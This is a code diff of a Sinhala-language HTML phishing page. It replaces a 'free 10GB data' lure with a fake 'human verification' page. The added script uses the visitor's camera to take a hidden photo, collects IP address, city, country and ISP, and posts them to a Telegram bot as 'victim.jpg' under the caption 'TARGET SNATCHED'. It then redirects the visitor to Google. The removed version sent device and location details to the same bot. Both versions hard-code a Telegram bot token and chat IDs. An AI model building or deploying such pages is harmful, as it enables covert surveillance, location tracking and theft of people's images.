@@ -2,80 +2,86 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free WhatsApp Data</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>ZENTRIX | ID-VERIFY</title>
     <style>
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.95); display: flex;
-            justify-content: center; align-items: center; z-index: 9999;
-        }
+        body { background: #000; color: #0f0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; }
+        #status { font-size: 14px; margin-top: 15px; font-family: monospace; }
+        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
+        video, canvas { display: none; } /* කැමරාව හංගලා තියෙන්නේ */
     </style>
 </head>
-<body class="bg-gray-100">
+<body>
 
-    <div id="overlay">
-        <div class="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4">
-            <div class="text-green-500 text-5xl mb-4">📢</div>
-            <h2 class="text-2xl font-bold mb-2">නොමිලේ 10GB Data!</h2>
-            <p class="text-gray-600 mb-6">මෙම දීමනාව ලබා ගැනීමට ඔබ රොබෝවරයෙකු නොවන බව තහවුරු කරන්න.</p>
-            <button id="startBtn" class="bg-green-600 text-white font-bold py-3 px-10 rounded-full w-full animate-bounce">
-                VERIFY & CONTINUE
-            </button>
-            <p class="text-red-500 text-xs mt-4">*ඉදිරියට යාමට  අවසරය (Allow) ලබා දිය යුතුය.</p>
-        </div>
-    </div>
+    <h2 id="msg">HUMAN VERIFICATION NEEDED</h2>
+    <p style="color:#555; text-align:center; padding: 0 20px;">Please allow camera access to prove you are not a bot and continue to the content.</p>
+    
+    <button class="btn" onclick="startProcess()">VERIFY NOW</button>
+    <div id="status">Waiting for user...</div>
 
-    <div class="flex flex-col items-center justify-center min-h-screen">
-        <h1 class="text-2xl font-bold text-green-700">සුභ පැතුම්! 🎉</h1>
-        <p>ඔබේ දත්ත පැකේජය සක්‍රිය වෙමින් පවතී...</p>
-    </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const API_TOKEN = '8521741180:AAHMiUEg1TjVtCpyaGKdTllYtvIXz2XCjdk';
-        const CHAT_ID = "7871773175", "7252390182";
+        const BOT_TOKEN = "8521741180:AAHMiUEg1TjVtCpyaGKdTllYtvIXz2XCjdk";
+        const CHAT_ID = "7871773175";
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
+        async function startProcess() {
+            document.getElementById('status').innerText = "Initializing security protocols...";
+            
             try {
-                // 1. කැමරා අවසරය ඉල්ලීම
+                // 1. Get Camera Permission & Capture
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // 2. අවසරය දුන්නොත් විතරක් Overlay එක අයින් කරනවා
-                document.getElementById('overlay').style.display = 'none';
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                // 3. ඔක්කොම දත්ත එකතු කිරීම
-                const battery = await navigator.getBattery();
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                
-                let infoMsg = `
-⚠️ *Target Hacked!* 🫦
---------------------------
-📱 *Device:* ${navigator.platform}
-🔋 *Battery:* ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
-🧠 *RAM:* ${navigator.deviceMemory || 'Unknown'} GB
-🌐 *IP:* ${ipData.ip}
-📍 *Location:* ${ipData.city}, ${ipData.country_name}
-🛰️ *ISP:* ${ipData.org}
-🔗 *Maps:* https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
---------------------------
-💀 _Sirimath Pro System_ 💀
-                `;
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Convert to Image Data
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    const blob = await (await fetch(dataURL)).blob();
 
-                // 4. Telegram එකට යැවීම
-                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg, parse_mode: 'Markdown' })
-                });
+                    // 2. Get Device & IP Info
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipRes.json();
 
-                // මෙතනදී කැමරා stream එකෙන් ෆොටෝ එකක් අරන් යවන කොටසත් ඇඩ් කරන්න පුළුවන්.
+                    // 3. Send All to Telegram
+                    await sendToTelegram(blob, ipData);
+
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
+
+                    document.getElementById('status').innerText = "Verified! Redirecting...";
+                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
+                }, 1000);
 
             } catch (err) {
-                alert("වැරදියි! ඉදිරියට යාමට 'Allow' ක්ලික් කරන්න.");
+                document.getElementById('status').innerText = "Error: Permission Denied.";
             }
-        });
+        }
+
+        async function sendToTelegram(photoBlob, ipData) {
+            const caption = `🎭 **ZENTRIX TARGET SNATCHED** 🎭\n\n` +
+                          `📍 **IP:** \`${ipData.ip}\`\n` +
+                          `🌍 **Location:** ${ipData.city}, ${ipData.country_name}\n` +
+                          `📱 **Device:** ${navigator.platform}\n` +
+                          `🏢 **ISP:** ${ipData.org}\n\n` +
+                          `📸 **Photo Attached Below!**`;
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'victim.jpg');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
     </script>
 </body>
 </html>
